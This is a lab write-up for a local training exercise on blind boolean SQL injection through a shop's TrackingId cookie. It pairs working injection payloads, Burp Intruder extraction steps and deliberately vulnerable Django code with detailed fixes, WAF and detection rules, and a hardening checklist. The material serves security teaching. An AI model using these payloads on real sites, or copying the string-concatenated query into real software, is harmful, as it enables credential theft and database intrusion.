# Lab 11 — Blind SQL injection with conditional responses

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses> |
| Lab id | `psw-sqli-11-blind-conditional-responses` |
| Vulnerability class | SQL Injection — blind boolean-based via cookie |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | SQLite (single-service Django app) |
| Host URL | <http://127.0.0.1:18011/> |
| Flag | `FLAG{psw-sqli-11-blind-conditional-admin-access}` |

### Objective

The shop stores an analytics `TrackingId` cookie on first visit and looks it up against a `tracked_users` table on every page load. The query result itself is never rendered; only a "Welcome back!" banner appears when the `WHERE` clause matches at least one row. This presence/absence signal is the only side channel available, so the attacker has to use it to enumerate the administrator's password one character at a time, then authenticate at `/login` and read the flag from `/my-account`.

---

## 2. Exploit walkthrough

The vulnerable sink is the `TrackingId` cookie being concatenated into a raw SQL `WHERE TrackingId = '<cookie>'` lookup. SQL errors are swallowed, so any malformed payload collapses into the same response as "no matching row". The attacker has to craft payloads that are syntactically valid *and* return at least one row only when a probed condition is true.

**Step 1 — baseline requests (benign / malicious)**

Visit the home page once to receive the legitimate cookie:

```http
GET / HTTP/1.1
Host: 127.0.0.1:18011
```

Response sets `Set-Cookie: TrackingId=psw-lab-visitor-001`. A reload now shows the `Welcome back!` banner because:

```sql
SELECT TrackingId FROM tracked_users WHERE TrackingId = 'psw-lab-visitor-001'
```

returns one row. Replacing the cookie with any non-matching value (or removing it) makes the banner disappear — that is the boolean side channel.

**Step 2 — confirm injection and control the boolean**

Always-true and always-false payloads prove the cookie is concatenated into SQL:

```
Cookie: TrackingId=x' OR '1'='1
```

```sql
SELECT TrackingId FROM tracked_users WHERE TrackingId = 'x' OR '1'='1'
```

Banner present — every row in `tracked_users` matches. Flip it:

```
Cookie: TrackingId=x' OR '1'='2
```

Banner absent. The attacker now has a reliable truth oracle.

**Step 3 — pivot to the `users` table with a conditional `UNION`**

The `tracked_users` table does not hold the password, but a subquery against `users` can be embedded inside a payload whose *top-level* row count depends on a character test. Using the canonical PortSwigger payload shape:

```
Cookie: TrackingId=x' UNION SELECT 'x' WHERE (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a'-- -
```

Executed SQL:

```sql
SELECT TrackingId FROM tracked_users
WHERE TrackingId = 'x'
UNION SELECT 'x'
WHERE (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a'-- -'
```

If the first character of `administrator`'s password is `a`, the `UNION SELECT 'x'` branch returns one row → banner shows. Otherwise no rows → banner hidden.

**Step 4 — automate with Burp Intruder**

- Send the request to Intruder.
- Mark the probed character (`'a'`) as the single payload position.
- Payload type: Simple list, values `a`–`z` (the seeder draws from `string.ascii_lowercase`).
- Grep — Match: the string `Welcome back!`.
- Run the attack; the one response that matches reveals character 1.

Then sweep position 1 → 8 (seeded length is 8; see `shop/management/commands/seed.py`) by incrementing the `SUBSTR(password,1,1)` offset: `SUBSTR(password,2,1)`, `SUBSTR(password,3,1)`, and so on. A Cluster Bomb attack over `(position, character)` gets the whole password in one pass — roughly `8 × 26 = 208` requests.

**Step 5 — authenticate and collect the flag**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:18011
Content-Type: application/x-www-form-urlencoded

username=administrator&password=<recovered>
```

The login form uses the Django ORM and is *not* injectable — real credentials are required. After login, `/my-account` renders the banner containing `FLAG{psw-sqli-11-blind-conditional-admin-access}`.

---

## 3. Vulnerable code

### Endpoint: `GET /`

[shop/views.py:53-71](shop/views.py#L53-L71)

```python
def home(request: HttpRequest) -> HttpResponse:
    tracking_id = request.COOKIES.get("TrackingId")

    tracked = False
    if tracking_id is not None:
        query = (
            "SELECT TrackingId FROM tracked_users "
            "WHERE TrackingId = '" + tracking_id + "'"
        )
        try:
            with connection.cursor() as cursor:
                cursor.execute(query)
                rows = cursor.fetchall()
                tracked = len(rows) > 0
        except Exception:
            tracked = False
```

Four design choices compound into a clean boolean oracle:

1. The `TrackingId` cookie is concatenated straight into a raw SQL literal ([shop/views.py:61-64](shop/views.py#L61-L64)) — classic CWE-89 string-building.
2. `cursor.execute(query)` ([shop/views.py:67](shop/views.py#L67)) is called with one argument, so the DB driver binds nothing and treats the entire payload as SQL text.
3. The `try/except Exception` block ([shop/views.py:65-71](shop/views.py#L65-L71)) swallows *every* driver error and resolves to `tracked = False` — so "syntax error", "no matching row", and "column does not exist" all produce identical responses, leaving attackers a friction-free truth channel.
4. The only output surface is the `tracked` boolean passed into the template.

### The side-channel template

[shop/templates/shop/home.html:5-7](shop/templates/shop/home.html#L5-L7)

```html
{% if tracked %}
    <div class="welcome-banner">Welcome back!</div>
{% endif %}
```

Presence of the literal string `Welcome back!` in the rendered HTML is the entire leak. Intruder's grep-match rule keys off it directly.

### Why the login form cannot be bypassed

[shop/views.py:103-108](shop/views.py#L103-L108)

```python
username = request.POST.get("username", "")
password = request.POST.get("password", "")

user = User.objects.filter(username=username, password=password).first()
```

The login uses the Django ORM, which binds parameters. `' OR 1=1-- ` is matched as a literal username. The attacker is forced through the blind oracle.

### Seeded password shape

[shop/management/commands/seed.py:36-37](shop/management/commands/seed.py#L36-L37) — the administrator password is drawn from `string.ascii_lowercase` and is 8 characters long, sized so a learner with Burp Intruder Community Edition can brute each position in seconds.

[shop/management/commands/seed.py:46-47](shop/management/commands/seed.py#L46-L47) — the `tracked_users` table is seeded with the same cookie baked in at [shop/views.py:43](shop/views.py#L43), so the legitimate user flow produces the banner without leaking the password.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **Raw string concatenation of a cookie into SQL** | Any client-controlled byte sequence becomes SQL syntax. Cookies are as user-controlled as URL parameters. |
| **Silently swallowed exceptions** | SQL errors and empty result sets collapse into one response. The attacker sees a clean two-state oracle instead of three noisy states. |
| **Boolean side channel in the rendered page** | Even though the query text is never echoed, the banner's presence/absence is enough to exfiltrate arbitrary data one bit at a time. |
| **Trusted cookies at the query layer** | Cookies set by the server aren't trustworthy on the return trip — the client can rewrite them freely. |
| **Long-lived cookie with no integrity seal** | The one-year `max_age` and lack of signature make probing cheap. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the query

The minimum fix is one character change — pass the cookie as a bound parameter, not as string text:

```python
# shop/views.py — fixed
query = "SELECT TrackingId FROM tracked_users WHERE TrackingId = %s"
with connection.cursor() as cursor:
    cursor.execute(query, [tracking_id])
    rows = cursor.fetchall()
    tracked = len(rows) > 0
```

With the value bound, `x' UNION SELECT 'x' WHERE ...-- ` is matched against `TrackingId` as a literal string. The `tracked_users` table has no such row, so the banner stays off and the oracle closes.

### 5.2 Prefer the ORM

Raw SQL is unjustified here — a single-column equality lookup is the ORM's sweet spot:

```python
tracked = TrackedUser.objects.filter(tracking_id=tracking_id).exists()
```

Django always binds parameters, and `.exists()` avoids materialising a row.

### 5.3 Validate cookie shape before the query

Tracking ids are structured data. Reject anything that doesn't match the server-issued format:

```python
import re
TRACKING_ID_RE = re.compile(r"^psw-lab-visitor-[a-z0-9]{3,64}$")

tracking_id = request.COOKIES.get("TrackingId", "")
if not TRACKING_ID_RE.fullmatch(tracking_id):
    tracking_id = None
```

Every injection payload in Section 2 contains a character outside `[a-z0-9-]`; an allow-list rejects them before the DB sees them.

### 5.4 Sign the cookie

Even better, never let the DB trust an unauthenticated cookie. Issue a cookie whose value is signed with an HMAC (Django's `signing.Signer` or `SignedCookieSession`) and refuse to query on any cookie that fails signature verification. Attackers can no longer forge tracking ids at all.

### 5.5 Don't swallow exceptions

Collapsing `except Exception: tracked = False` is what gives the attacker the noise-free oracle. At minimum, log the exception server-side with the offending payload; at best, surface a generic 500 so probing blows up loudly in the access log rather than looking like ordinary traffic.

### 5.6 Uniform responses

Section 5.1 removes the injection. As a defence-in-depth measure, consider decoupling the banner from the DB result entirely (e.g. a signed cookie tells the app whether to greet the user) so that even a future bug in the DB-lookup path cannot leak anything.

---

## 6. Network / infrastructure-level mitigation

### 6.1 Web Application Firewall

A WAF in front of the app with the OWASP Core Rule Set flags the Intruder payload shape:

- `REQUEST-942-APPLICATION-ATTACK-SQLI` catches `UNION SELECT`, `SUBSTR(`, `OR '1'='1`, commented-out trailers (`-- -`).
- Inspect cookies, not just query/body — many vendors disable cookie scanning by default, leaving exactly this blind spot.
- Blind-SQLi is typically driven by hundreds of near-identical requests: configure a per-cookie / per-IP **rate limit** on `/` (e.g. 30 req/min) so Intruder stalls long before finishing.
- Add **anomaly scoring** for requests where the same URL is hit repeatedly with mutating cookie values — a strong fingerprint of boolean-blind extraction.

A WAF is **not a substitute** for fixing the code. Signature evasion for blind SQLi is well understood; treat it as one layer.

### 6.2 Least-privilege database account

- `SELECT` on `tracked_users` only, if the home-page path can run under a separate role.
- No access to `users`, `flags`, or other schemas unless the request is authenticated.
- Consider database-level row-level security so a `UNION` against `users` returns zero rows for the tracking role even if injection succeeds.
- No `FILE`, `DDL`, or `COPY` privileges.

### 6.3 Monitoring & detection

- Alert on high-rate traffic where the only dimension varying is the `TrackingId` cookie — legitimate traffic never does that.
- Alert on cookies containing `'`, `%27`, `UNION`, `SELECT`, `SUBSTR`, `--`, `/*`, `;` — these are never present in server-issued ids.
- Log the executed SQL (or its parameters) so that a post-incident review can reconstruct what the attacker probed.
- Watch for a rapid-fire sequence of ~200 requests from one source followed by a successful `/login` POST; that pattern is boolean-blind extraction followed by credential reuse.

### 6.4 Network segmentation

- The DB listens only on `127.0.0.1` / the private Docker network; `docker-compose.yml:10` binds the web container to `127.0.0.1:18011` — loopback-only for a local lab.
- Block egress from the DB container so a future exploit cannot pivot to DNS or HTTP exfiltration.

### 6.5 Session / cookie hardening

- Issue signed tracking cookies (Section 5.4) so the WAF and the app agree on what a "valid" cookie looks like.
- Set `HttpOnly` on analytics cookies that don't need JS access. The current cookie is written with `httponly=False` at [shop/views.py:90](shop/views.py#L90) — tighten to `True` in production.

---

## 7. Defense-in-depth checklist

- [ ] Parameterised queries everywhere (no `+`, `%`, f-string, or `format()` SQL builders) — including cookies and headers, not just query params and form bodies.
- [ ] ORM by default; raw SQL is the exception and is code-reviewed.
- [ ] Server-issued identifiers are signed (HMAC / Django `signing`) so forged values never reach the DB.
- [ ] Strict allow-list validation on every cookie/header that reaches a query, even ones your team controls.
- [ ] Do not catch-and-swallow DB exceptions in request handlers — let them surface, log them, and alert on them.
- [ ] Rate-limit per session / per cookie for endpoints that run DB lookups on every hit.
- [ ] Response body for an authenticated-vs-anonymous visitor must not depend on a DB WHERE-clause match over attacker-controlled input.
- [ ] WAF with cookie inspection, SQLi signatures, and anomaly-based rate limits.
- [ ] Separate DB role per application with least privilege; no DDL, no file I/O.
- [ ] Outbound connections from the DB tier blocked at the network layer.
- [ ] SAST rules in CI catching `cursor.execute(f"...")`, `cursor.execute("..." + x)`, and `except Exception: pass`.
- [ ] Alerting on repeated requests with varying cookie values against the same path.

---

## 8. References

- PortSwigger Web Security Academy — [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
- PortSwigger — [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- Django docs — [Executing custom SQL directly](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly)
- Django docs — [Cryptographic signing](https://docs.djangoproject.com/en/5.0/topics/signing/)
- OWASP CRS — <https://coreruleset.org/>
